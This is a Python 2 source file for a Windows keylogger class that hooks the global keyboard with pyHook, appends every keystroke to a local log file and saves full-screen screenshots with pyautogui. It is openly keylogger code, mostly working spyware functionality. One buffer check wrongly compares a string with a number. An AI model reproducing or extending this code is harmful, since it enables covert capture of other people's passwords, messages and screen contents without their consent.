import pyHook
import pythoncom
from multiprocessing import Process
import os
from win32api import GetSystemMetrics
from ctypes import windll
import pyautogui
import DataInfo

SCREEN_WIDTH = GetSystemMetrics(0)
SCREEN_HEIGHT = GetSystemMetrics(1)
DATA_FILE_NAME = "data_file.log"
CURRENT_PATH = os.path.dirname(os.path.realpath(__file__))


class KeyCatcher:
    """
    manage the keylogger's actions
    """

    def __init__(self, data_path=CURRENT_PATH):
        """
        sets the logger
        """
        self.data_info = DataInfo.DataInfo(data_path, "log", "screenshot", "self")
        self.data = ""
        self.data_info.new_data_file("data_file.log")
        # create a hook manager
        self.hm = pyHook.HookManager()

    def set_key_hook(self):
        """
        set hooks for events
        """
        # watch for events
        self.hm.KeyDown = self.key_press
        # set the hook
        self.hm.HookKeyboard()

    def get_data_file_path(self):
        return self.data_info.get_file_path_by_type(DATA_FILE_NAME)

    def key_press(self, event):
        """
        handle key presses by inserting them to the file
        @param event: key press event
        """
        print 'MessageName:', event.MessageName
        print 'Message:', event.Message
        print 'Time:', event.Time
        print 'Window:', event.Window
        print 'WindowName:', event.WindowName
        print 'Ascii:', event.Ascii, chr(event.Ascii)
        print 'Key:', event.Key
        print 'KeyID:', event.KeyID
        print 'ScanCode:', event.ScanCode
        print 'Extended:', event.Extended
        print 'Injected:', event.Injected
        print 'Alt', event.Alt
        print 'Transition', event.Transition
        print '---'
        # catch special keys (such as ctrl, back...)
        if not 33 < event.Ascii < 126:
            self.data += "(-%s-)" % event.Key
        else:
            self.data += event.Key
        if self.data > 100:
            self.data_info.write_data_file_end(self.data, DATA_FILE_NAME)
            self.data = ""
        # return True to pass the event to other handlers
        return True

    def take_screen_shot(self):
        """
        makes the system aware of the screen's size and takes a screenshot
        """
        user32 = windll.user32
        user32.SetProcessDPIAware()
        screen_shot = pyautogui.grab(region=(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT))
        save_path = self.data_info.get_type_path("screenshot")
        # create a non existing name
        i = 1 + len(os.listdir(save_path))
        screen_shot.save(save_path + "\\screenshot%i.jpg" % i)
